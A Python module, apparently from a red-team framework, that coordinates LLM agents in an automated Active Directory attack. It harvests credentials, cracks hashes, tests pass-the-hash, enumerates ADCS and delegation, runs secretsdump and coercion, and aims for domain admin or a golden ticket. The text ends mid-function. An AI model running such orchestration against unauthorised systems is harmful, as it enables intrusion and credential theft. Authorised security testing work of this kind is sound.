"""Main orchestrator for multi-agent red team operations.

This module provides the entry point for coordinating multi-agent
red team operations in a Kubernetes environment.
"""

from __future__ import annotations

import asyncio
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import dreadnode as dn
import rigging as rg
from dreadnode.agent import Agent, Thread
from dreadnode.agent.stop import tool_use
from loguru import logger

from ares.core.config import get_agent_config, get_namespace, get_redis_url
from ares.core.dispatcher import RedTeamDispatcher
from ares.core.factories.red_agents import (
    create_role_hooks,
    load_agent_instructions,
)
from ares.core.models import (
    AgentInfo,
    AgentRole,
    Credential,
    Host,
    InvestigationStage,
    RedTeamState,
    SharedRedTeamState,
    Target,
    TaskStatus,
)
from ares.core.recovery import OperationRecoveryManager
from ares.core.task_queue import RedisTaskQueue
from ares.core.workflows import exploitation_workflow
from ares.reports.redteam import RedTeamReportGenerator
from ares.tools.red import RedTeamReportingTools
from ares.tools.red.orchestrator import OrchestratorTools

# Default max runtime in seconds (60 minutes), configurable via ARES_MAX_RUNTIME env var
DEFAULT_MAX_RUNTIME = float(os.environ.get("ARES_MAX_RUNTIME", "3600"))

# Grace period for running crack tasks when operation is completing (5 minutes)
CRACK_TASK_GRACE_PERIOD = float(os.environ.get("ARES_CRACK_GRACE_PERIOD", "300"))


def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
    if not openai_api_key:
        return model
    if not model.startswith(("gpt-", "openai/")):
        return model
    try:
        generator = rg.get_generator(model)
    except Exception:
        return model
    if hasattr(generator, "api_key"):
        generator.api_key = openai_api_key
    return generator


def _resolve_orchestrator_model(model: str | None) -> str:
    resolved = model or os.getenv("ARES_ORCHESTRATOR_MODEL") or os.getenv("ARES_MODEL")
    if not resolved:
        raise ValueError(
            "No model specified for operation. Provide a model argument or set "
            "ARES_ORCHESTRATOR_MODEL/ARES_MODEL in the environment."
        )
    return resolved


def _is_pass_the_hash_compatible(hash_value: str, hash_type: str | None) -> bool:
    if not hash_value:
        return False
    normalized_type = (hash_type or "").strip().upper()
    if normalized_type and normalized_type not in {"NTLM", "LM", "NTLMV1", "NTLMV2"}:
        return False
    value = hash_value.strip()
    if "$" in value:
        return False
    if ":" in value:
        parts = value.split(":")
        if len(parts) != 2:
            return False
        lm_part, ntlm_part = parts
        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
            return False
        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))


async def _wait_for_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> bool:
    """
    Wait for required worker agents to come online.

    Args:
        dispatcher: The dispatcher instance
        required_roles: List of roles that must be online (e.g., ["recon"])
        timeout: Maximum time to wait in seconds

    Returns:
        True if all required workers came online, False if timeout
    """
    import time

    start = time.time()

    logger.info(f"Waiting for required workers: {required_roles}")

    while time.time() - start < timeout:
        status = dispatcher.get_agent_status()
        online_roles = {
            info["role"] for name, info in status.items() if info["status"] != "offline"
        }

        missing = set(required_roles) - online_roles
        if not missing:
            logger.success(f"All required workers online: {required_roles}")
            return True

        elapsed = time.time() - start
        logger.debug(f"Waiting for workers: {missing} (elapsed: {elapsed:.0f}s)")
        await asyncio.sleep(5)

    logger.error(
        f"Timeout waiting for workers after {timeout}s. "
        f"Missing: {set(required_roles) - online_roles}"
    )
    return False


async def _load_or_initialize_state(
    dispatcher: RedTeamDispatcher,
    recovery: OperationRecoveryManager,
    operation_id: str,
    resume_from_checkpoint: bool,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None,
) -> None:
    if resume_from_checkpoint:
        state = await recovery.recover_operation(operation_id)
        if state:
            dispatcher._shared_state = state
            if state.all_credentials or state.all_hashes:
                dispatcher.signal_credential_access()
            logger.info(f"Resumed operation {operation_id} from checkpoint")
            return
        logger.warning(f"No checkpoint found for {operation_id}, starting fresh")

    state = dispatcher.shared_state
    # Enable real-time publishing of discoveries to Redis
    state.set_dispatcher(dispatcher)
    state.target = Target(
        ip=target_ips[0] if target_ips else "",
        domain=target_domain,
    )
    if target_domain:
        state.add_domain(target_domain)

    # Add all target IPs as placeholder hosts so scanners can track them
    # Services will be merged when recon discovers them
    for ip in target_ips:
        placeholder_host = Host(ip=ip, hostname="", os="Unknown", roles=[], services=[])
        state.add_host(placeholder_host)
    if target_ips:
        logger.info(f"Added {len(target_ips)} target IPs as placeholder hosts")

    if initial_credential:
        state.add_credential(initial_credential, "initial")
        dispatcher.signal_credential_access()


async def _register_agents(
    dispatcher: RedTeamDispatcher,
    agents: dict[AgentRole, AgentInfo],
) -> None:
    for agent_info in agents.values():
        await dispatcher.register(agent_info)


async def _ensure_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> None:
    if not await _wait_for_required_workers(dispatcher, required_roles, timeout=timeout):
        raise RuntimeError(
            f"Required workers ({', '.join(required_roles)}) did not come online within "
            f"{timeout:.0f} seconds. Ensure worker pods are deployed and running."
        )


async def _prime_operation(
    recovery: OperationRecoveryManager,
    dispatcher: RedTeamDispatcher,
    target_ips: list[str],
    target_domain: str,
) -> None:
    success = await recovery.checkpoint(dispatcher.shared_state)
    if success:
        logger.info("Initial checkpoint saved - workers can now discover operation")
    else:
        logger.warning("Failed to save initial checkpoint - workers may not discover operation")


def _log_orchestrator_result(result: rg.RunResult, model: str) -> None:
    logger.success(
        f"✅ Model connection successful: {model} "
        f"(messages: {len(result.messages)}, tokens: {result.usage})"
    )
    log_fn = logger.error if result.stop_reason == "error" else logger.success
    log_msg = (
        f"Orchestrator failed after {result.steps} steps: {result.error}"
        if result.stop_reason == "error"
        else f"Orchestrator completed: {result.steps} steps, {result.stop_reason}"
    )
    log_fn(log_msg)


def _create_completion_tools(
    shared_state: SharedRedTeamState,
    dispatcher: RedTeamDispatcher,
) -> tuple[Any, Any]:
    """
    Create the completion tools that can access shared state.

    These tools are used as stop conditions for the orchestrator agent.
    They need to modify the shared state, so we create them as closures.

    Returns:
        Tuple of (complete_operation, announce_domain_admin) tools
    """

    @dn.tool
    def complete_operation(summary: str) -> str:
        """
        Mark the multi-agent red team operation as complete.

        Use this tool when you have:
        - Achieved domain admin access OR exhausted all attack paths
        - Coordinated with all specialized agents
        - Collected all available credentials and hashes
        - Generated golden ticket (if krbtgt hash was found)

        Args:
            summary: Executive summary of the operation including:
                - All domain administrators compromised
                - Attack paths used
                - Total credentials obtained
                - Hosts compromised
                - Key vulnerabilities exploited

        Returns:
            Confirmation message

        Example:
            >>> complete_operation("Domain admin achieved via ADCS ESC1...")
        """
        shared_state.completed = True
        logger.success(f"🎯 Multi-agent operation completed: {summary}")
        return f"✓ Operation marked as complete. Summary: {summary}"

    @dn.tool
    async def announce_domain_admin(
        domain: str,
        username: str,
        credential_type: str,
        attack_path: str,
    ) -> str:
        """
        Announce successful achievement of Domain Admin privileges.

        Use this tool when you have confirmed Domain Admin access through:
        - Valid DA credentials (password or hash)
        - Forged Golden Ticket with krbtgt hash
        - Successful DA-level command execution (e.g., DCSync, remote code execution on DC)

        Args:
            domain: Target domain name
            username: Domain Admin username achieved
            credential_type: Type of credential (password, hash, golden_ticket)
            attack_path: Brief description of the attack path used to achieve DA

        Returns:
            Confirmation message

        Example:
            >>> await announce_domain_admin(
            ...     domain="example.local",
            ...     username="Administrator",
            ...     credential_type="password",
            ...     attack_path="ADCS ESC1 exploit -> cert auth"
            ... )
        """
        await dispatcher.announce_domain_admin(
            username=username,
            domain=domain,
            attack_path=attack_path,
            credential_type=credential_type,
            source_agent="ares-orchestrator",
        )
        logger.success(
            f"🎯 DOMAIN ADMIN ACHIEVED! Domain: {domain}, User: {username}, "
            f"Type: {credential_type}, Path: {attack_path}"
        )
        return (
            f"✓ Domain Admin access confirmed for {domain}\\{username} "
            f"via {credential_type} (attack path: {attack_path})"
        )

    return complete_operation, announce_domain_admin


async def run_multi_agent_operation(  # noqa: PLR0912
    operation_id: str,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
    resume_from_checkpoint: bool = False,
    redis_url: str | None = None,
    namespace: str | None = None,
    model: str | None = None,
    max_steps: int = 200,
    checkpoint_interval: int = 60,
    openai_api_key: str | None = None,
    report_dir: str | Path | None = None,
    max_runtime: float | None = None,
) -> dict[str, Any]:
    """
    Main entry point for multi-agent red team operations.

    Args:
        operation_id: Unique identifier for this operation
        target_domain: Target domain (e.g., "example.local")
        target_ips: List of target IPs to scan
        initial_credential: Optional initial credential
        resume_from_checkpoint: Resume from previous checkpoint
        redis_url: Redis URL for state persistence (default: derived from config)
        namespace: Kubernetes namespace (default: from config)
        model: LLM model to use
        max_steps: Maximum agent steps
        checkpoint_interval: Seconds between checkpoints
        openai_api_key: Optional OpenAI API key to bind directly to the generator
        report_dir: Directory to write the final report (default: ./reports)
        max_runtime: Maximum runtime in seconds (default: 1800s / 30 min, via ARES_MAX_RUNTIME env)

    Returns:
        Operation results summary
    """
    # Resolve max runtime from parameter, env, or default
    resolved_max_runtime = max_runtime if max_runtime is not None else DEFAULT_MAX_RUNTIME
    # Resolve config defaults
    redis_url = redis_url or get_redis_url()
    namespace = namespace or get_namespace()
    model = _resolve_orchestrator_model(model)

    start_time = datetime.now(timezone.utc)

    # Initialize infrastructure
    dispatcher = RedTeamDispatcher(redis_url=redis_url)
    await dispatcher.start(operation_id)

    # Acquire exclusive operation lock
    task_queue = RedisTaskQueue(redis_url)
    await task_queue.connect()

    if not await task_queue.acquire_operation_lock(operation_id):
        await task_queue.disconnect()
        raise RuntimeError(
            f"Operation {operation_id} is already running by another orchestrator. "
            "Use a different operation_id or wait for the existing operation to complete."
        )

    recovery = OperationRecoveryManager(
        redis_url=redis_url,
        checkpoint_interval=checkpoint_interval,
    )
    await recovery.start()

    # Resume or create new operation
    await _load_or_initialize_state(
        dispatcher=dispatcher,
        recovery=recovery,
        operation_id=operation_id,
        resume_from_checkpoint=resume_from_checkpoint,
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
    )

    # Create agent ensemble
    agents = await _create_agent_ensemble(
        dispatcher=dispatcher,
        model=model,
        max_steps=max_steps,
        namespace=namespace,
    )

    # Register all agents with dispatcher
    await _register_agents(dispatcher, agents)

    # Wait for required workers before starting
    await _ensure_required_workers(dispatcher, ["recon"], timeout=120.0)

    # Start background tasks
    tasks = [
        asyncio.create_task(recovery.start_periodic_checkpoint(dispatcher), name="checkpoint"),
        asyncio.create_task(_monitor_agent_health(dispatcher), name="health_monitor"),
        asyncio.create_task(exploitation_workflow(dispatcher), name="exploitation_workflow"),
        asyncio.create_task(_extend_operation_lock(task_queue, operation_id), name="lock_extender"),
        asyncio.create_task(
            _auto_credential_expansion(dispatcher), name="auto_credential_expansion"
        ),
        asyncio.create_task(_auto_credential_access(dispatcher), name="auto_credential_access"),
        asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
        asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
        asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
        asyncio.create_task(_auto_bloodhound(dispatcher), name="auto_bloodhound"),
        asyncio.create_task(_auto_coercion(dispatcher), name="auto_coercion"),
        asyncio.create_task(
            _auto_delegation_enumeration(dispatcher), name="auto_delegation_enumeration"
        ),
        asyncio.create_task(
            _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
        ),
    ]

    # Build initial prompt for orchestrator
    initial_prompt = _build_orchestrator_prompt(
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
    )

    try:
        # Do initial checkpoint so workers can discover the operation.
        await _prime_operation(recovery, dispatcher, target_ips, target_domain)

        # Create the orchestrator agent with tools
        orchestrator_agent = await _create_orchestrator_agent(
            dispatcher=dispatcher,
            model=model,
            max_steps=max_steps,
            openai_api_key=openai_api_key,
        )

        logger.info(f"Starting orchestrator for {target_domain}")
        logger.info(f"Initial prompt:\n{initial_prompt}")

        # NOTE: Initial reconnaissance is dispatched by the orchestrator agent
        # through its template instructions (dispatch_recon). The orchestrator
        # coordinates all work through dispatch tools, not direct execution.

        # Run the orchestrator agent - this drives the entire operation
        # Track crash attempts to prevent infinite loops
        orchestrator_crash_count = 0
        max_orchestrator_crashes = 3
        result = None

        with dn.run(tags=["multi-agent-operation", target_domain]):
            dn.log_params(
                model=model,
                operation_id=operation_id,
                target_domain=target_domain,
                target_ips=target_ips,  # type: ignore[arg-type]
                max_steps=max_steps,
            )

            # Run the orchestrator agent with crash recovery
            while orchestrator_crash_count < max_orchestrator_crashes:
                try:
                    logger.info(f"🤖 Connecting to {model}...")
                    result = await orchestrator_agent.run(initial_prompt)
                    _log_orchestrator_result(result, model)
                    break  # Success - exit the retry loop
                except Exception as e:
                    orchestrator_crash_count += 1
                    state = dispatcher.shared_state
                    has_progress = len(state.all_credentials) > 0 or len(state.all_hashes) > 0

                    logger.error(
                        f"Orchestrator crashed (attempt {orchestrator_crash_count}/{max_orchestrator_crashes}): {e}",
                        exc_info=True,
                    )

                    if has_progress and orchestrator_crash_count < max_orchestrator_crashes:
                        logger.warning(
                            f"Orchestrator crashed but has progress ({len(state.all_credentials)} creds, "
                            f"{len(state.all_hashes)} hashes). Continuing background tasks and retrying..."
                        )
                        # Give background tasks time to work before retrying
                        await asyncio.sleep(30)
                    elif not has_progress:
                        # No progress - fail fast
                        raise
                    else:
                        # Max crashes reached with progress - continue without orchestrator
                        logger.warning(
                            f"Orchestrator crashed {max_orchestrator_crashes} times. "
                            "Continuing with background tasks only."
                        )
                        break

        # Handle case where result is None (all retries failed but we have progress)
        if result is None:
            # Create a synthetic stop reason for the completion logic below
            class SyntheticResult:
                stop_reason = "orchestrator_crashed"
                steps = 0
                error = "Orchestrator crashed after max retries"

            result = SyntheticResult()  # type: ignore[assignment]

        stop_reason = getattr(result, "stop_reason", None)
        if (
            stop_reason == "max_steps_reached"
            and not dispatcher.shared_state.pending_tasks
            and not dispatcher.shared_state.completed
        ):
            pending_plaintext = bool(
                getattr(dispatcher.shared_state, "pending_credential_findings", set())
            )
            if pending_plaintext:
                logger.warning(
                    "Orchestrator stopped ({}) but pending plaintext credentials exist; "
                    "keeping operation open",
                    stop_reason,
                )
            else:
                dispatcher.shared_state.completed = True
                logger.warning(
                    "Orchestrator stopped ({}) with no pending tasks; marking operation complete",
                    stop_reason,
                )

        exploitation_status = await dispatcher.get_exploitation_status()
        if not dispatcher.shared_state.completed:
            has_pending_vulns = bool(exploitation_status.get("pending"))
            if not dispatcher.shared_state.pending_tasks and not has_pending_vulns:
                pending_plaintext = bool(
                    getattr(dispatcher.shared_state, "pending_credential_findings", set())
                )
                if pending_plaintext:
                    logger.warning("Pending plaintext credentials exist; keeping operation open")
                else:
                    dispatcher.shared_state.completed = True
                    if stop_reason == "error":
                        logger.warning(
                            "Orchestrator stopped with error; no pending tasks or unexploited "
                            "vulnerabilities, marking operation complete"
                        )
                    else:
                        logger.info(
                            "No pending tasks or unexploited vulnerabilities; marking operation complete"
                        )

        if dispatcher.shared_state.completed:
            logger.info("Operation marked complete; skipping post-run wait")
            # Still wait for running crack tasks to complete
            await _wait_for_crack_tasks(dispatcher)
        else:
            # Wait for any remaining background tasks
            await _wait_for_completion(dispatcher, tasks, max_runtime=resolved_max_runtime)

        exploitation_status = await dispatcher.get_exploitation_status()

        # Get final state
        final_state = dispatcher.shared_state
        end_time = datetime.now(timezone.utc)

        report_path = None
        report_markdown = None
        try:
            report_path, report_markdown = _generate_multi_agent_report(
                final_state,
                report_dir=report_dir,
                exploitation_status=exploitation_status,
            )
        except Exception as e:
            logger.warning(f"Failed to generate report for {operation_id}: {e}")

        return {
            "operation_id": operation_id,
            "success": final_state.has_domain_admin,
            "domain_admin_achieved": final_state.has_domain_admin,
            "domain_admin_path": final_state.domain_admin_path,
            "golden_ticket_forged": final_state.has_golden_ticket,
            "credentials_discovered": len(final_state.all_credentials),
            "hashes_discovered": len(final_state.all_hashes),
            "hosts_discovered": len(final_state.all_hosts),
            "vulnerabilities_discovered": exploitation_status.get(
                "total_discovered",
                len(final_state.discovered_vulnerabilities),
            ),
            "vulnerabilities_exploited": exploitation_status.get(
                "total_succeeded",
                len(final_state.exploited_vulnerabilities),
            ),
            "tasks_completed": len(final_state.completed_tasks),
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat(),
            "duration_seconds": (end_time - start_time).total_seconds(),
            "report_path": str(report_path) if report_path else None,
            "report_markdown": report_markdown,
        }

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise

    finally:
        # Cleanup - cancel all tasks and suppress CancelledError
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        # Release operation lock
        await task_queue.release_operation_lock(operation_id)
        await task_queue.disconnect()

        await dispatcher.stop()
        logger.info("Operation cleanup complete")


async def _create_orchestrator_agent(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    openai_api_key: str | None = None,
) -> Agent:
    """
    Create the orchestrator agent that coordinates the multi-agent operation.

    The orchestrator has:
    - Completion tools (complete_operation, announce_domain_admin) for stop conditions
    - OrchestratorTools for dispatching tasks to specialized worker agents
    - RedTeamReportingTools for recording findings and status

    The orchestrator does NOT execute exploitation tools directly. It delegates
    all tool execution to specialized worker agents (RECON, CREDENTIAL_ACCESS,
    CRACKER, ACL, PRIVESC, LATERAL, COERCION).

    Args:
        dispatcher: The dispatcher for inter-agent communication
        model: LLM model to use
        max_steps: Maximum agent steps
        openai_api_key: Optional OpenAI API key to bind directly to the generator

    Returns:
        Configured orchestrator agent
    """
    shared_state = dispatcher.shared_state
    # Ensure real-time publishing is enabled
    if not shared_state._dispatcher:
        shared_state.set_dispatcher(dispatcher)

    # Create completion tools that can modify shared state (for stop conditions)
    complete_operation, announce_domain_admin = _create_completion_tools(shared_state, dispatcher)

    # Create orchestrator tools with dispatcher wired in
    orchestrator_tools = OrchestratorTools()
    orchestrator_tools.set_dispatcher(dispatcher)
    orchestrator_tools.set_shared_state(shared_state)

    # Reporting tools for status tracking
    reporting_tools = RedTeamReportingTools()
    reporting_tools.set_state(shared_state)

    tools = [
        complete_operation,  # Stop condition tool for marking operation complete
        announce_domain_admin,  # Stop condition tool for announcing DA achievement
        orchestrator_tools,  # Coordination tools (dispatch_*, get_*, broadcast_*)
        reporting_tools,  # record_finding, generate_report
    ]

    # Load orchestrator-specific instructions
    instructions = load_agent_instructions(AgentRole.ORCHESTRATOR)

    # Create hooks for monitoring and guidance
    hooks = create_role_hooks(AgentRole.ORCHESTRATOR, dispatcher, shared_state)

    logger.info(f"Creating orchestrator agent with {len(tools)} toolsets, max_steps={max_steps}")

    resolved_model = _resolve_model_generator(model, openai_api_key)
    return dn.Agent(
        name="ares-orchestrator",
        model=resolved_model,
        instructions=instructions,
        max_steps=max_steps,
        tools=tools,  # type: ignore[arg-type]
        hooks=hooks,
        stop_conditions=[
            tool_use("complete_operation"),
            tool_use("announce_domain_admin"),
        ],
        thread=Thread(),  # type: ignore[call-arg]
    )


def _generate_multi_agent_report(
    state: SharedRedTeamState,
    *,
    report_dir: str | Path | None,
    exploitation_status: dict[str, Any] | None = None,
) -> tuple[Path, str]:
    report_state = _build_redteam_report_state(state, exploitation_status)
    resolved_report_dir = Path(report_dir or "./reports").resolve()
    resolved_report_dir.mkdir(parents=True, exist_ok=True)

    report_generator = RedTeamReportGenerator()
    report_content = report_generator.generate(report_state)

    report_filename = f"{state.operation_id}_report.md"
    report_path = resolved_report_dir / report_filename
    report_path.write_text(report_content)
    logger.success(f"Red team report generated: {report_path}")
    return report_path, report_content


def _build_redteam_report_state(
    state: SharedRedTeamState,
    exploitation_status: dict[str, Any] | None = None,
) -> RedTeamState:
    target = state.target or Target(ip="", domain="")
    report_state = RedTeamState(operation_id=state.operation_id, target=target)
    report_state.completed = state.completed
    report_state.started_at = state.started_at
    report_state.stage = InvestigationStage.SYNTHESIS
    report_state.hosts = list(state.all_hosts)
    report_state.users = list(state.all_users)
    report_state.credentials = list(state.all_credentials)
    report_state.hashes = list(state.all_hashes)
    report_state.shares = list(state.all_shares)
    report_state.has_domain_admin = state.has_domain_admin
    report_state.has_golden_ticket = state.has_golden_ticket
    report_state.timeline = list(state.operation_timeline)
    report_state.identified_techniques = set(state.identified_techniques)
    report_state.weaknesses = [
        f"{v.vuln_type} on {v.target} ({v.vuln_id})"
        for v in state.discovered_vulnerabilities.values()
    ]
    if exploitation_status:
        report_state.vulnerability_count = exploitation_status.get(
            "total_discovered",
            len(state.discovered_vulnerabilities),
        )
        report_state.exploited_count = exploitation_status.get(
            "total_succeeded",
            len(state.exploited_vulnerabilities),
        )
    return report_state


async def _create_agent_ensemble(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    namespace: str,
) -> dict[AgentRole, AgentInfo]:
    """
    Create the agent ensemble with role-specific configurations.

    Capabilities are loaded from config (single source of truth).

    Args:
        dispatcher: The dispatcher instance
        model: LLM model to use
        max_steps: Maximum agent steps
        namespace: Kubernetes namespace

    Returns:
        Dict mapping roles to agent info
    """
    agents: dict[AgentRole, AgentInfo] = {}

    # All roles to create
    roles_to_create = [
        AgentRole.RECON,
        AgentRole.CREDENTIAL_ACCESS,
        AgentRole.CRACKER,
        AgentRole.ACL,
        AgentRole.PRIVESC,
        AgentRole.LATERAL,
        AgentRole.COERCION,
    ]

    for role in roles_to_create:
        # Get capabilities from config (single source of truth)
        config_key = role.value  # e.g., "recon", "credential_access"
        agent_config = get_agent_config(config_key)
        capabilities = set(agent_config.capabilities)

        name = f"ares-{role.value.replace('_', '-')}"
        agent_info = AgentInfo(
            name=name,
            pod_name=f"{name}-0",  # Will be updated by K8s discovery
            role=role,
            capabilities=capabilities,
            status="idle",
        )
        agents[role] = agent_info

    return agents


async def _monitor_agent_health(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task to monitor agent health.

    Monitors agent heartbeats and alerts on:
    - Agents going offline
    - Agents reporting errors in heartbeat data
    - Agents persistently offline (3+ consecutive checks)

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between health checks
    """
    offline_counts: dict[str, int] = {}  # Track consecutive offline counts

    while True:
        try:
            agent_status = dispatcher.get_agent_status()

            offline_agents = [
                name for name, status in agent_status.items() if status["status"] == "offline"
            ]

            # Track consecutive offline counts
            for agent_name in agent_status:
                if agent_name in offline_agents:
                    offline_counts[agent_name] = offline_counts.get(agent_name, 0) + 1
                else:
                    offline_counts[agent_name] = 0

            # Alert on newly offline agents
            if offline_agents:
                for agent_name in offline_agents:
                    count = offline_counts.get(agent_name, 0)
                    if count == 1:
                        # First time offline - ERROR level
                        logger.error(f"Agent {agent_name} is now OFFLINE")
                    elif count == 3:
                        # Persistently offline - CRITICAL level
                        logger.critical(
                            f"Agent {agent_name} has been offline for {count} consecutive checks "
                            f"({count * check_interval:.0f}s). This may indicate a fatal error "
                            "such as authentication failure or misconfiguration."
                        )
                    elif count > 3 and count % 10 == 0:
                        # Remind every 10 checks if still offline
                        logger.critical(
                            f"Agent {agent_name} still offline after {count} checks "
                            f"({count * check_interval:.0f}s)"
                        )

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:  # noqa: PERF203
            break
        except Exception as e:
            logger.error(f"Health monitor error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _extend_operation_lock(
    task_queue: RedisTaskQueue,
    operation_id: str,
    interval: float = 600.0,
) -> None:
    """
    Periodically extend the operation lock to prevent expiry during long operations.

    Args:
        task_queue: The task queue with lock methods
        operation_id: Operation ID to extend lock for
        interval: Seconds between lock extensions (default: 10 minutes)
    """
    while True:
        await asyncio.sleep(interval)
        try:
            success = await task_queue.extend_operation_lock(operation_id)
            if not success:
                logger.warning(f"Failed to extend lock for operation {operation_id}")
        except Exception as e:
            logger.error(f"Error extending operation lock: {e}")


async def _auto_credential_expansion(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
    min_hosts: int = 1,
) -> None:
    """
    Background task that automatically triggers credential expansion when new credentials appear.

    Monitors the shared state for new credentials and dispatches lateral movement
    tests without requiring the orchestrator LLM to explicitly call trigger_credential_expansion.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between credential checks
        min_hosts: Minimum hosts required before triggering expansion
    """
    from ares.core.workflows import credential_expansion_loop

    processed_creds: set[tuple[str, str, int]] = set()  # (username, domain, password_hash)
    expansion_running = False

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping auto credential expansion")
                break

            # Skip if not enough hosts discovered yet
            if len(state.all_hosts) < min_hosts:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) "
                    "before credential expansion"
                )
                continue

            # Check for new credentials
            current_creds = {
                (c.username, c.domain or "", hash(c.password or "")) for c in state.all_credentials
            }
            new_creds = current_creds - processed_creds

            if new_creds and not expansion_running:
                new_count = len(new_creds)
                logger.info(
                    f"🔑 Auto-expansion: {new_count} new credential(s) detected, "
                    f"triggering lateral movement tests against {len(state.all_hosts)} hosts"
                )

                expansion_running = True
                try:
                    await credential_expansion_loop(dispatcher, max_iterations=3)
                except Exception as e:
                    logger.warning(f"Credential expansion failed: {e}")
                finally:
                    expansion_running = False
                    # Mark all current creds as processed
                    processed_creds.update(current_creds)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential expansion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_mssql_detection(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that periodically scans for MSSQL hosts and queues vulnerabilities.

    This catches MSSQL hosts discovered by worker agents that don't go through
    the orchestrator's publish_host() method.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between MSSQL scans
    """
    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping MSSQL detection")
                break

            # Skip if no hosts discovered yet
            if not state.all_hosts:
                logger.debug("MSSQL scanner: no hosts discovered yet")
                continue

            # Always scan all hosts - dispatcher handles deduplication via already_queued check
            # This ensures we catch hosts whose services were updated after initial discovery
            queued = await dispatcher.scan_hosts_for_mssql()

            if queued > 0:
                logger.warning(
                    f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"MSSQL detection error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_adcs_enumeration(  # noqa: PLR0912
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
    max_retries: int = 2,
) -> None:
    """
    Background task that automatically runs ADCS enumeration when:
    1. ADCS servers are detected (CertEnroll share indicator)
    2. Credentials are available for authentication

    This catches ADCS servers discovered by worker agents and triggers
    certipy_find to enumerate ESC1-ESC15 vulnerabilities.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between ADCS checks
        max_retries: Maximum retry attempts per server (reduced to avoid blocking privesc queue)
    """
    # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
    adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
    successful_servers: set[str] = set()  # Servers with successful enumeration
    failed_servers: set[str] = set()  # Servers that consistently fail - stop retrying
    retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
    stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete
            if state.completed or state.has_domain_admin:
                logger.debug("Operation complete, stopping ADCS enumeration")
                break

            # Need credentials to enumerate ADCS
            if not state.all_credentials:
                logger.debug("ADCS scanner: waiting for credentials")
                continue

            # Find ADCS servers (hosts with CertEnroll share)
            adcs_servers = dispatcher.find_adcs_servers()

            if not adcs_servers:
                logger.debug("ADCS scanner: no ADCS servers detected yet")
                continue

            # Get domains we know about
            domains: set[str] = set()
            if state.target and state.target.domain:
                domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    domains.add(cred.domain)

            current_time = asyncio.get_event_loop().time()

            # Try to enumerate each ADCS server with available credentials
            for server_ip, server_hostname in adcs_servers:
                # Skip servers we've already successfully enumerated
                if server_ip in successful_servers:
                    continue

                # Skip servers that have consistently failed (stop wasting privesc queue time)
                if server_ip in failed_servers:
                    continue

                # Count total failures for this server across all credentials
                server_failure_count = sum(
                    1 for k, v in adcs_attempts.items() if k[0] == server_ip and v[1] >= max_retries
                )
                if server_failure_count >= 2:
                    logger.warning(
                        f"⏭️ Auto-ADCS: Skipping {server_ip} - failed with multiple credentials"
                    )
                    failed_servers.add(server_ip)
                    continue

                for cred in state.all_credentials:
                    if not cred.password:
                        continue

                    cred_key = (server_ip, cred.username, cred.domain or "")

                    # Check if we've already attempted with this credential
                    if cred_key in adcs_attempts:
                        task_id, attempt_count, last_attempt = adcs_attempts[cred_key]

                        # Check if the task completed successfully
                        task_info = state.pending_tasks.get(task_id)
                        if task_info and task_info.status == TaskStatus.COMPLETED:
                            successful_servers.add(server_ip)
                            logger.info(f"ADCS enumeration succeeded for {server_ip}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check for stuck tasks (running > 8 minutes without completion)
                        if task_id in state.pending_tasks:
                            elapsed = current_time - last_attempt
                            if elapsed > stuck_task_timeout:
                                logger.warning(
